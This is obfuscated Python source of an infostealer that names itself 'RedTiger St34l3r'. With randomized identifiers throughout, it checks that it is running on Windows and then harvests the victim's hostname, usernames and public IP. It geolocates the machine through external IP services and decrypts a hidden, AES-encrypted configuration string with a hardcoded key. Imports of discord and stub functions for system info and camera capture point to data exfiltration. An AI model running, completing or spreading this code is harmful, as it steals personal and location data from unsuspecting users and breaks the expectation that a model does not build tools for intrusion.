
import sys

def PRWMAXYQDMMOZOOXEJMCNWJMISPQKHTIIAEDPZWRNJTTMWNXEYMBMHDOPFKZJLSKDGQBGJERPWGBE():
    def ODTHVIJPARWESOBTHFYHRWYKBYWDSUVVFJNNVEHJBWLQASOREDDCRTYDPZFRRKTFKYTNDVMPXJPLBZM():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL = ODTHVIJPARWESOBTHFYHRWYKBYWDSUVVFJNNVEHJBWLQASOREDDCRTYDPZFRRKTFKYTNDVMPXJPLBZM()
        if MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL == True:
            return MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL
    except:
        return True
    
if PRWMAXYQDMMOZOOXEJMCNWJMISPQKHTIIAEDPZWRNJTTMWNXEYMBMHDOPFKZJLSKDGQBGJERPWGBE() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def EQGUTINPLTZNBMWNAMXFWKNUUICGXVWUJUUIESDDEODROIPQGDRTWITRQIHIICLAOISPYPYTDLOFVIXQGL(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA): 
    MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_system_info = None
    return MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_system_info

def GWHYSKFPARTSSTAGOEVDLUJLZJSVIKYBHLIZSUGCHIQNSUZVRPWRNLP(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    PTFVBELLDASWTISAHWTICGXWXRXWETKLRZMCHMTOQNNOBFOWPRAINUEIWOPYZYXUNSUALCMVHYLK = None
    return PTFVBELLDASWTISAHWTICGXWXRXWETKLRZMCHMTOQNNOBFOWPRAINUEIWOPYZYXUNSUALCMVHYLK

def GNYZEKGSTOHYMBYRTEOHPWHOGUUSTSTFUPORCSZTQAIHZSFZDYWCGIP(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    PBSVRSJXSOYUSWEJJDBDEMMTTBPMSFBXDRCYZPHKRIXDCXIGGHTPBKFFTHCERIVLHZCFJUQNIJYFOLCNAZBIHEEQD = None
    return PBSVRSJXSOYUSWEJJDBDEMMTTBPMSFBXDRCYZPHKRIXDCXIGGHTPBKFFTHCERIVLHZCFJUQNIJYFOLCNAZBIHEEQD

def BKDIZQNMFUDTKLFMEXJGRAZURJLIZZZPEOLTYEGGPFMURVIFTRQAQVKXXTRHHXLGNFYEDIWISXYKGASNSU(): 
    YIUIFAPCBKYLRVWLAXXUYAJFAFPNYMTNREINKZHAYPAYGQQLCVUHRWROVTMM = None
    return YIUIFAPCBKYLRVWLAXXUYAJFAFPNYMTNREINKZHAYPAYGQQLCVUHRWROVTMM

def XYNBHQRMIVGBWYAGWQYOSHQSVREWMOVIPEIDFJUSBDAQWYAXJBWXEIALCUWMABLXDCJRRJHEDNXXJJYQWS(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA): 
    OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ = None
    JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH = None
    TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU = None
    VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ = None
    PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW = None
    PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT = None
    return OCKGIYGPQAGJGAUZVFSFEDSQQTMWTPTPTCNCCXQPTFDAMAHETEOKLSOXAXFYFIHXRIGCYFZNYKROCLOGUJHJ, JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH, TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU, VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ, PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW, PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT

def FSNGYPQFUGCLBOSYUZAZSVTQMPFCTWOARCNZHNTDNPWYWWCLJIZSPCOXNQPFSGO(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC = None
    QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ = None
    RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL = None
    return WFNWCSFGJVBRIBTXQTZZUOFJTGHFOAMVRGCHLAECFECOPMNWKIPSNYPQMBC, QJUOYQEYSJPBWBBGXFRPKSVNOHTOCHBLMFGDGKMGRCBRCCPUVWJVOZQUXTJITEIIWKMBURFYGCGFKIVZ, RMYPTMMFDHTOBQQRSTZXJRYTPUNMRSPBWRLIHVODXLIENWBICMRZOHTEJUELZVXMAL

def VZMHHXVVNLBKYGFPBTZHUNTNETZBHIPKCSQEELNFBOGIUVWIBSMTLFUFCYUNXFBJNSFDWZLEZLZNYQHEILTOAWUTY(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    ZIXUDJFTUJVKIVFYKFPYKPHPZOAWGNHOWIDMKFMSKKOSJRTTIPGDIBPOSSTBDEMMLSWBZWCQZXLOJFGBZAFYS = None
    return ZIXUDJFTUJVKIVFYKFPYKPHPZOAWGNHOWIDMKFMSKKOSJRTTIPGDIBPOSSTBDEMMLSWBZWCQZXLOJFGBZAFYS

def JRVEDPPAHECWFHMALHIJAYLINSCKOCFISRADKAZLKGGKTWKGUSPDYOOCIBIAOJZFTHVVKPNISWUN(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA):
    MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture = None
    return MYQFDSFWZGRDZPQAECMBQGECXSHHFRHFZVYBBDYNYBDWPLCPOL_camera_capture

def KTEPLLIUOTQSOWAKBMSAGVMSDICZMLTXWTMALNLVWAPMFONKSJEGDSQDPGCUFJDW(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA): 
    TABYBYSZTFNZIEIXEVYGRLCAPMZJMSYOMVFQJCJJONWOUJWESPXKSFEENZAQE = None
    return TABYBYSZTFNZIEIXEVYGRLCAPMZJMSYOMVFQJCJJONWOUJWESPXKSFEENZAQE

def TOBQYQVCPNISQDXVPJALMSETNSIICHBCPADUDRSAIWGFNTKYTUOBEGXBLED(): pass
def XLTMJTBKRBJRGVDODCOTEEZCAZHZDCRRVLAFRIWGBWMLCSOUFTNCWVEGRHVYUUHKPHSKWGPIMG(): pass
def TLXPLYMENBZMDJPGGOFMQCQMAQNBGXNUJJZZNCOCLFUZFXJFSREQVCSQXKOEEJSLFTLXTVIZAHQLPTIYZKQFFMNYGUPTUITWE(): pass
def MLDEEUTVUCXVYXLSYOGHVGSSKAKPILVUYROUNAEVGJNMLOHQZSRTR(): pass
def OQYURLSOEFKIWINHZVQPANZTEHZOOTAUXWXJQFQXZONGATZVQXQPLUWULKZ(): pass
def GMJPCPHYYIFWEKVKUKIIHVJAZNLWSHFXHCUTNXMFGVQUQRQZWZJZICFZWAYHFEGEKNYFGWA(): pass
def CTVTNFCEFKZHYOCMFDNCFHMYLQZTWCSUZQDSRQVWNISIKGESZGQCAAMDOKV(): pass
def IAEMBZMHOJMQHQQNTEKCMHORQFBNXVUXDDYTQJFASAMXCYBJMCQIMGPTDVZNDNZIXKMJP(): pass
def LGSMUXWORSODWMLOOARWRBRZHRJJTFNFDCJHZVQRDPINNPFRJEBLI(): pass
def RMRXMYLJJFAEYCGPIEQCVMIZPBOYOMZQJKPGZSHGIRZPVKBKVVKMZKWYIORKULLTKNIJJEWEMDD(): pass
def JOIMGTPPUCXKAVGVKONGEOXTKGXUEUDESUOKMVTRGCFCJCCENWIMSIXNAVI(): pass
def PXHEKWIEWZNVPMUUEBSMQQIAHNRPBLWFYMQHWSGVPKGABBXCPSLFRJJYHKTZIUSTKZGKQHDRQRAVVOTJQSNFOZZ(): pass

def DTCAAHEEOZZRHWDDFKQRQPDCGKZHJWKOTGVOCZCFBURZQUEDHPCUGNFBDKVZGGTJLMDFTQPVYHYTSJKMJKIEZKSZX(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def IYGSJRICIERKPDITYRITBRFTQSCJLFINONLNPCJZYXLQCZZFVSQE():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def SCHRFXRJUBNFDPPPZVCINWJMZHOCWZVXJOFQZRTSFXVTFRTPQSHZJROBC(HJNLJTHHVYOLNJMAVLNENTTOQIYPNWWEXOUBXESCOQEUFNREOARGENMBUFGFICQFKBSVKE, OZFCBGIQVKXDQIOLTWBCYPFKKNNDDHJFXAASKQZDYQTEEMPARVEWMEOTNENRRCYHGSCXPIIHETDLAPXLVP):
    def DKEVZULEKDWLAGHSWDBYPLBWJIKKZONWBERRSCBGRWKRXDWYMYXFLNERXY(FGORXKWMJRCREXQWCGKRTSTVMQNIGNWSFEGEOXGWUMNRBFXHEQUZDLQOTSXORLAGQYQNBFOSOT, GMQTOXXKPMYUUOHABGPKDRWKWMVDKJHPJABRZXXQGXQFOCCEFTVMAYAJJTEDN):
        AFADEIAWWAWHVETKOKULQXDIVKBYMRAXFLQHXYOOZQYVYSJJBBTJOCGAKTJUYQFRCTCDEJIGEDXGCGYFFEGKRRWUSFFHVHQB = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=GMQTOXXKPMYUUOHABGPKDRWKWMVDKJHPJABRZXXQGXQFOCCEFTVMAYAJJTEDN, iterations=100000, backend=default_backend())
        if isinstance(FGORXKWMJRCREXQWCGKRTSTVMQNIGNWSFEGEOXGWUMNRBFXHEQUZDLQOTSXORLAGQYQNBFOSOT, str):  
            FGORXKWMJRCREXQWCGKRTSTVMQNIGNWSFEGEOXGWUMNRBFXHEQUZDLQOTSXORLAGQYQNBFOSOT = FGORXKWMJRCREXQWCGKRTSTVMQNIGNWSFEGEOXGWUMNRBFXHEQUZDLQOTSXORLAGQYQNBFOSOT.encode()  
        return AFADEIAWWAWHVETKOKULQXDIVKBYMRAXFLQHXYOOZQYVYSJJBBTJOCGAKTJUYQFRCTCDEJIGEDXGCGYFFEGKRRWUSFFHVHQB.derive(FGORXKWMJRCREXQWCGKRTSTVMQNIGNWSFEGEOXGWUMNRBFXHEQUZDLQOTSXORLAGQYQNBFOSOT)

    HJNLJTHHVYOLNJMAVLNENTTOQIYPNWWEXOUBXESCOQEUFNREOARGENMBUFGFICQFKBSVKE_data = base64.b64decode(HJNLJTHHVYOLNJMAVLNENTTOQIYPNWWEXOUBXESCOQEUFNREOARGENMBUFGFICQFKBSVKE)
    GMQTOXXKPMYUUOHABGPKDRWKWMVDKJHPJABRZXXQGXQFOCCEFTVMAYAJJTEDN = HJNLJTHHVYOLNJMAVLNENTTOQIYPNWWEXOUBXESCOQEUFNREOARGENMBUFGFICQFKBSVKE_data[:16]
    YJQBPSPMETOSLESRFOKRHEHMUWHTQRREWELXEDODFFOTPUIVVVTSUQOFQGSG = HJNLJTHHVYOLNJMAVLNENTTOQIYPNWWEXOUBXESCOQEUFNREOARGENMBUFGFICQFKBSVKE_data[16:32]
    HJNLJTHHVYOLNJMAVLNENTTOQIYPNWWEXOUBXESCOQEUFNREOARGENMBUFGFICQFKBSVKE_data = HJNLJTHHVYOLNJMAVLNENTTOQIYPNWWEXOUBXESCOQEUFNREOARGENMBUFGFICQFKBSVKE_data[32:]
    VGIHCZDTYMBFPGLZWPGEZDYPEHZJANDHVRCFCGWYFRKCQGPJXHJDLSBYDZTEINGHTUTORSNLBCXUCUHJKNOAUNILIOENX = DKEVZULEKDWLAGHSWDBYPLBWJIKKZONWBERRSCBGRWKRXDWYMYXFLNERXY(OZFCBGIQVKXDQIOLTWBCYPFKKNNDDHJFXAASKQZDYQTEEMPARVEWMEOTNENRRCYHGSCXPIIHETDLAPXLVP, GMQTOXXKPMYUUOHABGPKDRWKWMVDKJHPJABRZXXQGXQFOCCEFTVMAYAJJTEDN)
    VBEWVEGSIKVSVBSBLYITAXUVDRHOUEWQWXRPFCCSUZIIOXOAEOMMDIISPDKIF = Cipher(algorithms.AES(VGIHCZDTYMBFPGLZWPGEZDYPEHZJANDHVRCFCGWYFRKCQGPJXHJDLSBYDZTEINGHTUTORSNLBCXUCUHJKNOAUNILIOENX), modes.CBC(YJQBPSPMETOSLESRFOKRHEHMUWHTQRREWELXEDODFFOTPUIVVVTSUQOFQGSG), backend=default_backend())
    VYVUOHUCHYAMDHPNJBAFZMXJITGKKZJEFFIZRKVKPEVZXMBHVIKUEFWIGTVXBDIPKPILTCTJQKUNPE = VBEWVEGSIKVSVBSBLYITAXUVDRHOUEWQWXRPFCCSUZIIOXOAEOMMDIISPDKIF.decryptor()
    WSJCUVMSIAYQVFCXVZLQYKZWZXQOTVQHLTVBTNFOSZEIXXZLOSWVLKNQDNJBDLEYXRWJDTVKUVDBECQGNGHFKCKTHOLJVLWJW = VYVUOHUCHYAMDHPNJBAFZMXJITGKKZJEFFIZRKVKPEVZXMBHVIKUEFWIGTVXBDIPKPILTCTJQKUNPE.update(HJNLJTHHVYOLNJMAVLNENTTOQIYPNWWEXOUBXESCOQEUFNREOARGENMBUFGFICQFKBSVKE_data) + VYVUOHUCHYAMDHPNJBAFZMXJITGKKZJEFFIZRKVKPEVZXMBHVIKUEFWIGTVXBDIPKPILTCTJQKUNPE.finalize()
    HOGPPBERLICCMNUQTYWAYHWAEQBUWZXMHFDMPFBDVGDSQQHQOOMIEZVFPDVKMZKPDLBWMPVKBEGVFGDHGQMDZJAIUCAD = padding.PKCS7(128).unpadder()
    OCFEDGBUDNUSMAQQNEJTBUZFWSJRJQEUDVWUMORFHTWAMFJUSEVGPWSUAWQEOHJJZ = HOGPPBERLICCMNUQTYWAYHWAEQBUWZXMHFDMPFBDVGDSQQHQOOMIEZVFPDVKMZKPDLBWMPVKBEGVFGDHGQMDZJAIUCAD.update(WSJCUVMSIAYQVFCXVZLQYKZWZXQOTVQHLTVBTNFOSZEIXXZLOSWVLKNQDNJBDLEYXRWJDTVKUVDBECQGNGHFKCKTHOLJVLWJW) + HOGPPBERLICCMNUQTYWAYHWAEQBUWZXMHFDMPFBDVGDSQQHQOOMIEZVFPDVKMZKPDLBWMPVKBEGVFGDHGQMDZJAIUCAD.finalize()
    return OCFEDGBUDNUSMAQQNEJTBUZFWSJRJQEUDVWUMORFHTWAMFJUSEVGPWSUAWQEOHJJZ.decode()

DTCAAHEEOZZRHWDDFKQRQPDCGKZHJWKOTGVOCZCFBURZQUEDHPCUGNFBDKVZGGTJLMDFTQPVYHYTSJKMJKIEZKSZX("")

try: KSEIFZCAVIJFXKVVEEMJQGSVLTQHITZXQLEAGGKHAYOSXEFZAPAPDVJGDQDGJRIFJQLHZZMAA    = socket.gethostname()
except: KSEIFZCAVIJFXKVVEEMJQGSVLTQHITZXQLEAGGKHAYOSXEFZAPAPDVJGDQDGJRIFJQLHZZMAA = "None"

try: HWQZSVDFSIMSQBVEEPJSHAGWWTAVYRKQYHEODTUOURJDPQFBMOOVDF    = os.getlogin()
except: HWQZSVDFSIMSQBVEEPJSHAGWWTAVYRKQYHEODTUOURJDPQFBMOOVDF = "None"

try: EBPUGGZBUXZTJUUNAKAQNHVLKGYYRJWFIELCDLRBFTNWWBDDSZLKIDVJHWJUZES    = win32api.GetUserNameEx(win32api.NameDisplay)
except: EBPUGGZBUXZTJUUNAKAQNHVLKGYYRJWFIELCDLRBFTNWWBDDSZLKIDVJHWJUZES = "None"

try: KTADSZROIQVKXEVFBLKTMAGPFKZLGWVYPRQRKMCLSUTTEQWCFMMQK    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: KTADSZROIQVKXEVFBLKTMAGPFKZLGWVYPRQRKMCLSUTTEQWCFMMQK = "None"

try: ONUWOMSQHOFNGAJOLHPJRHENDOCBOGTVEHKMCDAOCGZZSEHPHMWPQZVAQHNPMJBYFUKELXJNVBCWBZINXOHYDNOGHBRPNO    = socket.gethostbyname(socket.gethostname())
except: ONUWOMSQHOFNGAJOLHPJRHENDOCBOGTVEHKMCDAOCGZZSEHPHMWPQZVAQHNPMJBYFUKELXJNVBCWBZINXOHYDNOGHBRPNO = "None"

DWGNPQQKQVTSFSXENEKBPDNBXXTKMXRRHDIFZAWVUKPZGUMKXNMTB = r"""
UsMrhba933opnGkImkPlMYPSLwWAUKgWlmuJP9HGbHEVlJWr+Ymr9BvgoI5/EgGzJ8Ec8dB95eNcVW/JVH0VDGoAXWzgMQh4Ic5LRlTgmsHxItzj0vx/Lo2jQT1+JcOw2dubPBGp1UtCdjRcXghXyroVv6Ded6FO/ytEY5hgd9HEXnN03jLr7xNWrgW6SBV15cmRikhqPW9Wus+RPSn0Kg==
"""

NOTSBPIXAVVCWGRUWFYMVRWHSPNESTPAWQDFWWLZTJSSFYEKUSGCPRTBRJVTXXAJTWNHKDVBCYKGOUJDCRHLHEXKUDSTJRGCLIZJ            = "slMmjCGvCZJWbtARScddZfcIYkFxMyIkhuXbJzkrGMVbXJZsevxGnnCNlcEcBkSFAVDiZIJavTKmhrXmMAOqLBFfgOzHyZcCJzPUQCfIlTPNeFwhirUwFqQtSSBCvCsifQldHABRFGEeSciwtSDqDaNHmlqthScQoYs"
XIEHNMMYBCRFABUCYICFZTFLSLEARCFZVIPOGWLLNUEWYGLCUZMIKXQFSKANEVWOBEHLHLQBOBWCKA        = "None"
FSEQNBXZZBZQDXIQBWQPLZRLMTAILBWAXBLZWCNRRMCGZDTLOHZWGBAMRQHDKIWRPWITBFJYKMRGXKQUCGZSVAVSNKXDP    = 0xa80505
OCOKZAPOAWILFUIAMUHJOXCZOTPCCZXCIRJWXDQSTUTDJLJBFFY = "RedTiger St34l3r"
OSHPIUHGICAPWGMBRGEHNGFPLIZJRALNHIICANVIKADVLAELZAAIDEBNMJPMLOMNGIGDAHU   = "https://google.com"
SIWVHBFTDLLWWJGZQYCHKQQYCXFHKQFRMTNZOOLELRVVVLOOINAJQMPYOZZEFBEXHTVXNORXWNJWFXNZXHIVSBFLAAMMG    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
CVWAVFHYTZUKNGILELDDDRTGWOZUUPAQPKAIFTSCCBEKCAOBXOVYTRQ   = {"text": SIWVHBFTDLLWWJGZQYCHKQQYCXFHKQFRMTNZOOLELRVVVLOOINAJQMPYOZZEFBEXHTVXNORXWNJWFXNZXHIVSBFLAAMMG, "icon_url": OSHPIUHGICAPWGMBRGEHNGFPLIZJRALNHIICANVIKADVLAELZAAIDEBNMJPMLOMNGIGDAHU}
BKHADUEENVZYBCKRTPHJZEODXDIGPMEJFQORXQYFLDWWWBBUITABGCRTIUTZPXMHNCELKXYVMXFE    = f'`{HWQZSVDFSIMSQBVEEPJSHAGWWTAVYRKQYHEODTUOURJDPQFBMOOVDF} "{KTADSZROIQVKXEVFBLKTMAGPFKZLGWVYPRQRKMCLSUTTEQWCFMMQK}"`'
JOCMFRVMGIQTXZFFAFAZXHWFLFQEYTNKZLGXZKIKEOIICLYLLQTFBSLLDSIJFXYRBQLHUYGXMSCBCKDISBVA    = SCHRFXRJUBNFDPPPZVCINWJMZHOCWZVXJOFQZRTSFXVTFRTPQSHZJROBC(DWGNPQQKQVTSFSXENEKBPDNBXXTKMXRRHDIFZAWVUKPZGUMKXNMTB, NOTSBPIXAVVCWGRUWFYMVRWHSPNESTPAWQDFWWLZTJSSFYEKUSGCPRTBRJVTXXAJTWNHKDVBCYKGOUJDCRHLHEXKUDSTJRGCLIZJ)

OMSMEKZFCXRDIOBMCSHNWKXPXQTDJSXHSAQKYJTVVIURVZSSYGYABDXZFOBE           = os.getenv("WINDIR", None)
KEJSJBTLKTYHJEIZYMRLCYQENWAZQONBBLMFNOYEOOIRGQNYEJUBFRE       = os.getenv('USERPROFILE', None)
AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW     = os.getenv('LOCALAPPDATA', None)
QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT   = os.getenv('APPDATA', None)
NVNAPZMIPSCBGEPBWBADLGKKUGCJHZJVOWJGSDDBVMFSDZKJLYVCTVIAFOTFKGCAOKZJWFTATDKDO = os.getenv('ProgramFiles(x86)', None)
if NVNAPZMIPSCBGEPBWBADLGKKUGCJHZJVOWJGSDDBVMFSDZKJLYVCTVIAFOTFKGCAOKZJWFTATDKDO is None:
    NVNAPZMIPSCBGEPBWBADLGKKUGCJHZJVOWJGSDDBVMFSDZKJLYVCTVIAFOTFKGCAOKZJWFTATDKDO = os.getenv('ProgramFiles', None)

try:
    QCTMZVCTULWXVRZEQMUJKAGJUIYZVGEMCKBSBXDDYZLZYVKQCAWKZBGX = requests.get(f"https://{XIEHNMMYBCRFABUCYICFZTFLSLEARCFZVIPOGWLLNUEWYGLCUZMIKXQFSKANEVWOBEHLHLQBOBWCKA}/api/ip/ip={KTADSZROIQVKXEVFBLKTMAGPFKZLGWVYPRQRKMCLSUTTEQWCFMMQK}")
    BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA = QCTMZVCTULWXVRZEQMUJKAGJUIYZVGEMCKBSBXDDYZLZYVKQCAWKZBGX.json()

    IZZJAQZOZHSBDTUMXERDSSWRZRIQUZMOYEECNEELVYKBECMGRZPLAHMHVPXHRRKTLHFQUMFNIKWDBXS = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('country', "None")
    IZZJAQZOZHSBDTUMXERDSSWRZRIQUZMOYEECNEELVYKBECMGRZPLAHMHVPXHRRKTLHFQUMFNIKWDBXS_code = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('country_code', "None")
    UDFCVQOTGNMWLSYIUZBFPHSLMKQGCZZKOVDXVGUGOVEFUYADQLGYNFUTOJYNAMAEEOPPMCK = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('region', "None")
    UDFCVQOTGNMWLSYIUZBFPHSLMKQGCZZKOVDXVGUGOVEFUYADQLGYNFUTOJYNAMAEEOPPMCK_code = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('region_code', "None")
    KETVIBCYFJGZEGOTHBIYGXQLRVKUNWUVYZWRUSQAYESLSYLUIBXHMZFYTCTHT = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('zip', "None")
    KSDVXMCFQOTLVGHQKCWSMUUKBGZYBSCDOZUERYSQEJQEBTAHZYJIEUXPUHNPHERQEYNVJAHUOLIYEAHGPXNXRPUQEB = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('city', "None")
    OAIEBEZNWYFXHUXCNXCWCCBGHLKPGLRMEBFHTIEAOZIPHWVQRTYIAZQQPXQBJ = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('latitude', "None")
    WPQMKFQPSCXNIERUVFAXSRKZFRNXNVTODCNAFNGAESAAFQCFQCNBDUAWYUQUIMFLJIWRRIOVALGPPCMTU = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('longitude', "None")
    CPCKCNKVNATABZXGSVSHNQMUWXDKAVKAOMROJBUGRAUAXTCWXC = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('timezone', "None")
    FKSRIHDMYJORTTBNRUVOALIAVHEHWPAMDKPTQQWFEGSHPNJSPGKAFAPLINXIXKIIWJOTLXEVBTJWBLORKTWYG = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('isp', "None")
    QPSIUITEKWVZENVSKCXUNQCABFKTOXAWQEQQODLHBXWGQILSPOTKXNYKUZAXIOLBBKRUMZDLKSHWLFJKVATSAGKVBHLRKORJ = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('org', "None")
    OZQZGSRDYJTLQSYCRMKTQLNAAADTWNUJAHSAFDMHUJOZUVNMMHXAAN = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('as', "None")
except:
    QCTMZVCTULWXVRZEQMUJKAGJUIYZVGEMCKBSBXDDYZLZYVKQCAWKZBGX = requests.get(f"http://ip-api.com/json/{KTADSZROIQVKXEVFBLKTMAGPFKZLGWVYPRQRKMCLSUTTEQWCFMMQK}")
    BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA = QCTMZVCTULWXVRZEQMUJKAGJUIYZVGEMCKBSBXDDYZLZYVKQCAWKZBGX.json()

    IZZJAQZOZHSBDTUMXERDSSWRZRIQUZMOYEECNEELVYKBECMGRZPLAHMHVPXHRRKTLHFQUMFNIKWDBXS = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('country', "None")
    IZZJAQZOZHSBDTUMXERDSSWRZRIQUZMOYEECNEELVYKBECMGRZPLAHMHVPXHRRKTLHFQUMFNIKWDBXS_code = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('countryCode', "None")
    UDFCVQOTGNMWLSYIUZBFPHSLMKQGCZZKOVDXVGUGOVEFUYADQLGYNFUTOJYNAMAEEOPPMCK = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('regionName', "None")
    UDFCVQOTGNMWLSYIUZBFPHSLMKQGCZZKOVDXVGUGOVEFUYADQLGYNFUTOJYNAMAEEOPPMCK_code = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('region', "None")
    KETVIBCYFJGZEGOTHBIYGXQLRVKUNWUVYZWRUSQAYESLSYLUIBXHMZFYTCTHT = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('zip', "None")
    KSDVXMCFQOTLVGHQKCWSMUUKBGZYBSCDOZUERYSQEJQEBTAHZYJIEUXPUHNPHERQEYNVJAHUOLIYEAHGPXNXRPUQEB = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('city', "None")
    OAIEBEZNWYFXHUXCNXCWCCBGHLKPGLRMEBFHTIEAOZIPHWVQRTYIAZQQPXQBJ = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('lat', "None")
    WPQMKFQPSCXNIERUVFAXSRKZFRNXNVTODCNAFNGAESAAFQCFQCNBDUAWYUQUIMFLJIWRRIOVALGPPCMTU = BKDRHFRWOQGXUEWUNIACIDBCTVYRZJVUVWLIGVSJLJXIMRIMMUPIUJIGGA.get('lon', "None")
